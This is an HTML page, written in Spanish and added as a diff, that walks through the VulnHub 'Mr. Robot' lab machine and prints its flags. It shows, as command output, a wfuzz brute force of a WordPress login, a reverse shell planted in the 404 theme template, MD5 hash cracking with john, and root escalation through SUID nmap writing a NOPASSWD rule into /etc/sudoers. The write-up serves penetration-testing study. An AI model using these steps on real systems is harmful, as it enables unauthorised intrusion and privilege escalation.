@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Mr. Robot VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Mr. Robot VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Mr. Robot de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina Mr. Robot de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Mr. Robot VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Mr. Robot VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Mr. Robot de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Mr. Robot VulnHub</h1>
+          <p>Resolución de la máquina Mr. Robot de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.11
+Nmap scan report for 192.168.100.11
+PORT    STATE  SERVICE
+22/tcp  closed ssh
+80/tcp  open   http
+443/tcp open   https</span>
+</code></pre></div></div>
+
+<div><p>Al no haber nada interesante buscaremos directorios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u 192.168.100.11 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://192.168.100.11
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/wp-admin</span><span class="p">             (Status: 301) [Size: 239] [--> http://192.168.100.11/wp-admin/]
+/wp-content           (Status: 301) [Size: 241] [--> http://192.168.100.11/wp-content/]
+/blog                 (Status: 301) [Size: 235] [--> http://192.168.100.11/blog/]
+/dashboard            (Status: 302) [Size: 0] [--> http://192.168.100.11/wp-admin/]
+</span><span class="kd">/robots</span><span class="p">               (Status: 200) [Size: 41]</span>
+</code></pre></div></div>
+
+<div><p>Si miramos el robots encontramos dos archivos asi que los descargamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 192.168.100.11/robots
+User-agent: *
+fsocity.dic
+key-1-of-3.txt</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> 192.168.100.11/fsocity.dic 192.168.100.11/key-1-of-3.txt
+Longitud: 7245381 (6.9M) [text/x-c]
+Grabando a: «fsocity.dic»
+fsocity.dic                      100%[======================================>]
+«fsocity.dic» guardado [7245381/7245381]
+
+Longitud: 33 [text/plain]
+Grabando a: «key-1-of-3.txt»
+key-1-of-3.txt                   100%[======================================>]
+«key-1-of-3.txt» guardado [33/33]</span>
+</code></pre></div></div>
+
+<div><p>El primero contiene una flag y el segundo una lista de mas de 800k palabras</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+
+</span><span class="s2">❯ wc</span><span class="p"> -l fsocity.dic
+858160 fsocity.dic</span>
+</code></pre></div></div>
+
+<div><p>También habiamos visto un /wp-admin, donde podemos ver que el usuario admin no existe</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Podemos probar personajes de la serie, y elliot existe mas no sabemos su contraseña</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>En este punto podemos aplicar fuerza bruta con el diccionario que encontramos al inicio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w ./fsocity.dic -u http://192.168.100.11/wp-login.php -d </span><span class="no">"log=elliot&pwd=FUZZ&wp-submit=Log In&redirect_to=http://192.168.100.11/wp-admin/&testcookie="</span><span class="p"> -H </span><span class="no">"Cookie: wordpress_test_cookie=WP Cookie check"</span><span class="p"> -t 200 --hl 59
+Target: http://192.168.100.11/wp-login.php
+Total requests: 858160
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000858151:   </span><span class="na">302</span><span class="p">        0 L      0 W        0 Ch        "</span><span class="kd">ER28-0652</span><span class="p">"</span>
+</code></pre></div></div>
+
+<div><p>Encontramos que ER28-0652 es una contraseña valida, ahora iniciamos sesión</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Podemos ir a apariencia y editor para modificar un php</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>A la derecha tenemos algunos, podemos modificar el 404 con una reverse shell</p></div>
+<div><p><img src="./5.png"><p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Simplemente nos queda hacer una peticion a algo que no exista para invocar el 404</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 192.168.100.11/pwned</span>
+</code></pre></div></div>
+
+<div><p>Podemos listar con netcat o pwncat-cs para una shell mas interactiva</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo pwncat-cs</span><span class="p"> -lp 443
+Welcome to </span><span class="kd">pwncat</span><span class="p"> 🐈!
+</span><span class="s2">received</span><span class="p"> connection from </span><span class="na">192.168.100.11
+0.0.0.0</span><span class="p">:</span><span class="na">443</span><span class="p">: normalizing shell path
+</span><span class="na">192.168.100.11</span><span class="p">: registered new host w/ db
+</span><span class="no">(local)</span><span class="k"> pwncat</span><span class="p">$</span><span class="s2"> back
+</span><span class="kd">(remote) </span><span class="no">daemon@linux</span><span class="p">:</span><span class="no">/opt/bitnami/apps/wordpress/htdocs</span><span class="p">$ bash
+</span><span class="s2">daemon@linux</span><span class="p">:</span><span class="na">/opt/bitnami/apps/wordpress/htdocs</span><span class="p">$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+</span><span class="s2">daemon@linux</span><span class="p">:</span><span class="na">/opt/bitnami/apps/wordpress/htdocs</span><span class="p">$ hostname -I
+192.168.100.11
+</span><span class="s2">daemon@linux</span><span class="p">:</span><span class="na">/opt/bitnami/apps/wordpress/htdocs</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando archivos interesantes encontramos password.raw-md5 en /home/robot</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">daemon@linux</span><span class="p">:</span><span class="na">/home/robot</span><span class="p">$ cat password.raw-md5 
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</span><span class="s2">daemon@linux</span><span class="p">:</span><span class="na">/home/robot</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Aplicamos fuerza bruta con john y conseguimos la contraseña de robot</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hash
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</span><span class="s2">❯ john</span><span class="p"> --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-MD5
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">abcdefghijklmnopqrstuvwxyz</span><span class="p"> (</span><span class="kd">robot</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>En este punto podemos migrar a robot y conseguir otra flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">daemon@linux</span><span class="p">:</span><span class="na">/home/robot</span><span class="p">$ su robot
+Password: </span><span class="kd">abcdefghijklmnopqrstuvwxyz</span><span class="p">
+</span><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+</span><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.11 
+</span><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat key-2-of-3.txt 
+822c73956184f694993bede3eb39f959
+</span><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si buscamos por privilegios suid encontramos nmap entre otros</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+</span><span class="kd">/usr/local/bin/nmap</span><span class="p">
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</span><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+ 
+<div><p>Podemos guiarnos de <a href="https://gtfobins.github.io/gtfobins/nmap/">gtfobins</a> para conseguir shell como root y la ultima flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robot@linux</span><span class="p">:</span><span class="na">~</span><span class="p">$ nmap --interactive
+Welcome to Interactive Mode -- press h &ltenter> for help
+</span><span class="kd">nmap></span><span class="p"> !echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+waiting to reap child : No child processes
+</span><span class="kd">nmap></span><span class="p"> !sudo su
+</span><span class="s2">root@linux</span><span class="p">:</span><span class="na">/home/robot</span><span class="p"># cd
+</span><span class="s2">root@linux</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@linux</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+192.168.100.11
+</span><span class="s2">root@linux</span><span class="p">:</span><span class="na">~</span><span class="p"># cat key-3-of-3.txt 
+04787ddef27c3dee1ee161b21670b4e4
+</span><span class="s2">root@linux</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
